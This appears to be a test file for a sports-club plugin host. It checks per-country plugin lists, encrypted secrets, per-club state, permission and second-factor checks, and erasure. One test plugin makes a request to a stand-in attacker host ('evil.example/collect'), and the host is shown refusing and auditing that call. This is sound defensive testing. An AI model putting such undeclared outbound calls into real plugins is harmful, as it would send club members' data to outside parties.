// SPDX-License-Identifier: AGPL-3.0-only
/* eslint-disable @typescript-eslint/require-await -- test plugins and the fake remote answer at once */
// The plugin host (P2.7 part A, tests item 6) against the database: a club
// enables and configures plugins of its country; secrets are encrypted and
// never returned, logged or kept in history; a call gets exactly the club's
// settings and its own state; failures, timeouts and undeclared hosts are
// contained and audited; an incompatible plugin stops the start; the
// endpoints need their permissions (and a second factor) and other clubs see
// nothing; erasure removes a person's background checks.

import { sql } from "@clubadmin/db";
import { createTestDatabase, type TestDatabase } from "@clubadmin/db/testing";
import { definePlugin, type Plugin } from "@clubadmin/plugin-api";
import { type ClubPluginList, type InstalledPluginList, z } from "@clubadmin/shared";
import type { InjectOptions } from "fastify";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { DomainError } from "../../platform/domain/domain-error.ts";
import { buildClub, buildPerson, type BuiltClub } from "../../testing/builders.ts";
import { auditActionsOf } from "../../testing/core.ts";
import { devToken, TEST_DEV_AUTH_KEY } from "../../testing/oidc.ts";
import { type CoreServices, createCoreServices, testEncryption } from "../../testing/services.ts";
import { createTestApp, NO_RATE_LIMITS, type TestApp } from "../../testing/test-app.ts";
import { PluginRegistry } from "./plugins.registry.ts";
import { PluginsService } from "./plugins.service.ts";

const texts = (entries: Record<string, string>) => ({ sv: entries, en: entries, nb: entries });

/** A Swedish plugin with a setting, a secret, a declared host and state. */
const swedish = definePlugin({
  manifest: {
    id: "se.test.host",
    version: "1.0.0",
    publisher: "ClubAdmin tests",
    licence: "AGPL-3.0-only",
    pluginApi: "^1.0.0",
    capabilities: ["background-checks"],
    regions: ["SE"],
    data: [],
    config: [
      { key: "orgNumber", type: "text", label: "t.org", pattern: "\\d{6}-\\d{4}", required: true },
    ],
    secrets: ["apiKey"],
    network: ["api.authority.example"],
    texts: texts({ "t.org": "Organisationsnummer", "t.extract": "Utdrag", "t.law": "Lag" }),
  },
  backgroundChecks: {
    checkTypes: async (ctx) => {
      const calls = Number((await ctx.state.get("calls")) ?? 0) + 1;
      await ctx.state.set("calls", calls);
      const res = await ctx.http.request("https://api.authority.example/types", {
        headers: { authorization: `Bearer ${ctx.secrets.apiKey ?? ""}` },
      });
      ctx.log.info("types.read", { calls, org: String(ctx.config.orgNumber) });
      return [
        {
          key: "extract",
          name: "t.extract",
          initiator: "person",
          maxAgeDaysWhenPresented: res.status === 200 ? 183 : null,
          recheckMonths: null,
          minAge: 15,
          copyRetention: "none",
          methods: ["viewed"],
          cost: null,
          integration: "none",
        },
      ];
    },
    requirements: async () => [
      {
        category: "regular_contact_with_children",
        checkType: "extract",
        level: "required",
        basis: "t.law",
      },
    ],
    verifyPresented: async () => ({ outcome: "closed" }),
  },
});

const norwegian = definePlugin({
  manifest: { ...swedish.manifest, id: "no.test.host", regions: ["NO"], config: [], secrets: [] },
  backgroundChecks: swedish.backgroundChecks!,
});

type CheckTypesCall = NonNullable<Plugin["backgroundChecks"]>["checkTypes"];

/** Swedish plugins that fail: throws, never answers, calls an undeclared host. */
const failing = (id: string, checkTypes: CheckTypesCall) =>
  definePlugin({
    manifest: { ...swedish.manifest, id, config: [], secrets: [], network: [] },
    backgroundChecks: { ...swedish.backgroundChecks!, checkTypes, requirements: async () => [] },
  });
const throwing = failing("se.test.throws", () => Promise.reject(new TypeError("Anna Lindqvist")));
const hanging = failing("se.test.hangs", () => new Promise(() => undefined));
const sneaky = failing("se.test.sneaky", async (ctx) => {
  await ctx.http.request("https://evil.example/collect").catch(() => undefined);
  return [];
});

let t: TestDatabase;
let s: CoreServices;
let app: TestApp;
let club: BuiltClub;
let otherClub: BuiltClub;
let norway: BuiltClub;
let service: PluginsService;
const requests: { url: string; authorization: string | undefined }[] = [];

async function api(
  personId: string,
  method: "GET" | "PUT",
  url: string,
  body?: unknown,
  mfa = true,
) {
  return app.app
    .getHttpAdapter()
    .getInstance()
    .inject({
      method,
      url: `/api/v1${url}`,
      headers: { authorization: `Bearer ${await devToken(personId, { mfa })}` },
      ...(body !== undefined ? { payload: body as Record<string, unknown> } : {}),
    } satisfies InjectOptions);
}

const typesSchema = z.object({ types: z.array(z.unknown()), requirements: z.array(z.unknown()) });

beforeAll(async () => {
  t = await createTestDatabase();
  s = createCoreServices(t.db);
  app = await createTestApp({
    NODE_ENV: "development",
    DATABASE_URL: t.url("app"),
    DEV_AUTH: "true",
    DEV_AUTH_KEY: TEST_DEV_AUTH_KEY,
    ...NO_RATE_LIMITS,
  });
  club = await buildClub(s);
  otherClub = await buildClub(s);
  norway = await buildClub(s, { country: "NO" });
  service = new PluginsService(t.db, {
    registry: new PluginRegistry([swedish, norwegian, throwing, hanging, sneaky]),
    clubs: s.clubs,
    encryption: testEncryption(),
    timeoutMs: 200,
    send: async (url, init) => {
      requests.push({ url, authorization: init.headers?.authorization });
      return { status: 200, headers: {}, body: "{}" };
    },
  });
}, 120_000);

afterAll(async () => {
  await app?.close();
  await t?.drop();
});

describe("a club's plugins", () => {
  it("lists the plugins of the club's country, disabled at first", async () => {
    const swedishList = await service.clubPlugins(club.ctx, "sv");
    expect(swedishList.map((p) => p.id)).toEqual([
      "se.test.hangs",
      "se.test.host",
      "se.test.sneaky",
      "se.test.throws",
    ]);
    expect(swedishList.find((p) => p.id === "se.test.host")).toMatchObject({
      enabled: false,
      config: {},
      secrets: [{ name: "apiKey", set: false }],
      texts: { "t.org": "Organisationsnummer" },
    });
    expect((await service.clubPlugins(norway.ctx, "nb")).map((p) => p.id)).toEqual([
      "no.test.host",
    ]);
  });

  it("refuses another country's plugin, unknown plugins, invalid settings and undeclared secrets", async () => {
    const put = (id: string, body: Parameters<PluginsService["putClubPlugin"]>[2]) =>
      service.putClubPlugin(club.ctx, id, body).catch((e: unknown) => (e as DomainError).code);
    expect(await put("no.test.host", { enabled: true })).toBe("plugin_wrong_country");
    expect(await put("se.test.nope", { enabled: true })).toBe("plugin_not_installed");
    expect(await put("se.test.host", { enabled: true, config: { orgNumber: "123" } })).toBe(
      "plugin_config_invalid",
    );
    expect(await put("se.test.host", { enabled: true, config: {} })).toBe("plugin_config_invalid");
    expect(
      await put("se.test.host", {
        enabled: true,
        config: { orgNumber: "802000-1234" },
        secrets: { other: "x" },
      }),
    ).toBe("plugin_secret_unknown");
  });

  it("enables and configures a plugin with an encrypted secret that is never returned or kept in history", async () => {
    await service.putClubPlugin(club.ctx, "se.test.host", {
      enabled: true,
      config: { orgNumber: "802000-1234" },
      secrets: { apiKey: "s3cret-value" },
    });
    const listed = (await service.clubPlugins(club.ctx, "sv")).find(
      (p) => p.id === "se.test.host",
    )!;
    expect(listed).toMatchObject({
      enabled: true,
      config: { orgNumber: "802000-1234" },
      secrets: [{ name: "apiKey", set: true }],
    });
    expect(JSON.stringify(listed)).not.toContain("s3cret-value");
    const { rows } = await t.query<{ value: string }>(
      "admin",
      "SELECT value FROM public.club_plugin_secrets",
    );
    expect(rows).toHaveLength(1);
    expect(rows[0]!.value).not.toContain("s3cret");
    const history = await t.query<{ n: number }>(
      "admin",
      "SELECT count(*)::int AS n FROM history.record_changes WHERE table_name = 'public.club_plugin_secrets'",
    );
    expect(history.rows[0]!.n).toBe(0);
    expect(await auditActionsOf(t, club.id)).toEqual(
      expect.arrayContaining(["plugin.enabled", "plugin.configured"]),
    );
    const audited = await t.query<{ changed_fields: string[] }>(
      "admin",
      "SELECT changed_fields FROM audit.events WHERE action = 'plugin.configured' AND club_id = $1",
      [club.id],
    );
    expect(audited.rows[0]!.changed_fields).toEqual(["se.test.host", "config", "secret:apiKey"]);
  });

  it("gives a call the club's settings, the decrypted secret, the declared host and its own state", async () => {
    const first = await service.run(
      club.ctx,
      "se.test.host",
      (p, ctx) => p.backgroundChecks!.checkTypes(ctx),
      z.array(z.unknown()),
    );
    const second = await service.run(
      club.ctx,
      "se.test.host",
      async (p, ctx) => {
        await p.backgroundChecks!.checkTypes(ctx);
        return ctx.state.get("calls");
      },
      z.number(),
    );
    expect(first.ok).toBe(true);
    expect(second).toMatchObject({ ok: true, value: 2 });
    expect(requests.at(-1)).toEqual({
      url: "https://api.authority.example/types",
      authorization: "Bearer s3cret-value",
    });
    // The state is the club's own: another club's plugin state is empty.
    const { rows } = await t.query<{ club_id: string; value: number }>(
      "admin",
      "SELECT club_id, value FROM public.plugin_state",
    );
    expect(rows).toEqual([{ club_id: club.id, value: 2 }]);
  });

  it("refuses a call to a disabled plugin", async () => {
    await expect(
      service.run(otherClub.ctx, "se.test.host", async () => [], z.array(z.unknown())),
    ).rejects.toThrow(DomainError);
  });

  it("contains a plugin that throws, hangs or calls an undeclared host, and audits it", async () => {
    for (const id of ["se.test.throws", "se.test.hangs", "se.test.sneaky"]) {
      await service.putClubPlugin(club.ctx, id, { enabled: true });
    }
    const call = (id: string) =>
      service.run(
        club.ctx,
        id,
        (p, ctx) => p.backgroundChecks!.checkTypes(ctx),
        z.array(z.unknown()),
      );
    expect(await call("se.test.throws")).toMatchObject({
      ok: false,
      error: "plugin_failed",
      detail: "TypeError",
    });
    expect(await call("se.test.hangs")).toMatchObject({ ok: false, error: "plugin_timeout" });
    expect(await call("se.test.sneaky")).toMatchObject({ ok: true, value: [] });
    expect(requests.some((r) => r.url.includes("evil.example"))).toBe(false);
    const failed = await t.query<{ changed_fields: string[] }>(
      "admin",
      "SELECT changed_fields FROM audit.events WHERE action = 'plugin.call_failed' AND club_id = $1 ORDER BY created_at, id",
      [club.id],
    );
    expect(failed.rows.map((r) => r.changed_fields)).toEqual([
      ["se.test.throws", "plugin_failed"],
      ["se.test.hangs", "plugin_timeout"],
      ["se.test.sneaky", "plugin_network_refused"],
    ]);
    // The error's message (which may hold a name) is never stored.
    const all = await t.query<{ fields: string }>(
      "admin",
      "SELECT changed_fields::text AS fields FROM audit.events",
    );
    expect(all.rows.some((r) => r.fields.includes("Anna"))).toBe(false);
  });

  it("lists background-check types of the enabled plugins and names the ones that failed", async () => {
    const types = await service.backgroundCheckTypes(club.ctx, "sv");
    expect(types.items).toEqual([
      expect.objectContaining({
        pluginId: "se.test.host",
        key: "extract",
        name: "Utdrag",
        initiator: "person",
        minAge: 15,
      }),
    ]);
    expect(types.requirements).toEqual([
      {
        pluginId: "se.test.host",
        category: "regular_contact_with_children",
        checkType: "extract",
        level: "required",
        basis: "Lag",
      },
    ]);
    expect(types.unavailable).toEqual(["se.test.hangs", "se.test.throws"]);
    expect(typesSchema).toBeDefined();
  });
});

describe("the registry", () => {
  it("refuses an incompatible plugin, an unknown one and a duplicate at start", () => {
    const old = { ...swedish, manifest: { ...swedish.manifest, pluginApi: "^2.0.0" } };
    expect(() => new PluginRegistry([old])).toThrow(/cannot be installed/);
    const closed = { ...swedish, manifest: { ...swedish.manifest, licence: "Proprietary" } };
    expect(() => new PluginRegistry([closed])).toThrow(/licence Proprietary/);
    expect(() => PluginRegistry.fromConfig([swedish], ["se.test.other"])).toThrow(
      /unknown plugins/,
    );
    expect(() => new PluginRegistry([swedish, swedish])).toThrow(/twice/);
    expect(
      PluginRegistry.fromConfig([swedish, norwegian], ["no.test.host"])
        .all()
        .map((p) => p.manifest.id),
    ).toEqual(["no.test.host"]);
  });
});

describe("the endpoints", () => {
  it("lists the installation's plugins for operators only", async () => {
    const operator = await buildPerson(s);
    await t.query("admin", "INSERT INTO platform_operators (person_id) VALUES ($1)", [operator.id]);
    const res = await api(operator.id, "GET", "/ops/plugins");
    expect(res.statusCode).toBe(200);
    expect(res.json<InstalledPluginList>()).toEqual({ items: [], pluginApi: "1.0.0" });
    expect((await api(club.manager.id, "GET", "/ops/plugins")).statusCode).toBe(403);
  });

  it("needs club.plugins.manage with a second factor, and hides another club's", async () => {
    const res = await api(club.manager.id, "GET", `/clubs/${club.id}/plugins`);
    expect(res.statusCode).toBe(200);
    expect(res.json<ClubPluginList>()).toEqual({ items: [] });
    expect(
      (await api(club.manager.id, "GET", `/clubs/${club.id}/plugins`, undefined, false)).statusCode,
    ).toBe(403);
    expect((await api(otherClub.manager.id, "GET", `/clubs/${club.id}/plugins`)).statusCode).toBe(
      404,
    );
    const unknown = await api(club.manager.id, "PUT", `/clubs/${club.id}/plugins/se.test.host`, {
      enabled: true,
    });
    expect(unknown.statusCode).toBe(404);
  });
});

describe("erasure", () => {
  it("removes the person's background checks and requests", async () => {
    const person = await buildPerson(s);
    await s.memberships.addMember(club.ctx, person.id);
    await t.db.withTenant(club.ctx, async (tx) => {
      await tx.execute(sql`
        INSERT INTO public.background_checks
          (club_id, person_id, plugin_id, check_type, issuing_country, issued_on, verified_on, method)
        VALUES (${club.id}, ${person.id}, 'se.test.host', 'extract', 'SE', '2026-10-01', '2026-10-02', 'viewed')`);
      await tx.execute(sql`
        INSERT INTO public.background_check_requests
          (club_id, person_id, plugin_id, check_type, status, plugin_reference)
        VALUES (${club.id}, ${person.id}, 'se.test.host', 'extract', 'requested', 'ref-1')`);
    });
    await t.query("admin", "SELECT privacy.erase_person($1, 'test')", [person.id]);
    const left = await t.query<{ n: number }>(
      "admin",
      `SELECT (SELECT count(*) FROM public.background_checks WHERE person_id = $1)
            + (SELECT count(*) FROM public.background_check_requests WHERE person_id = $1) AS n`,
      [person.id],
    );
    expect(Number(left.rows[0]!.n)).toBe(0);
  });
});
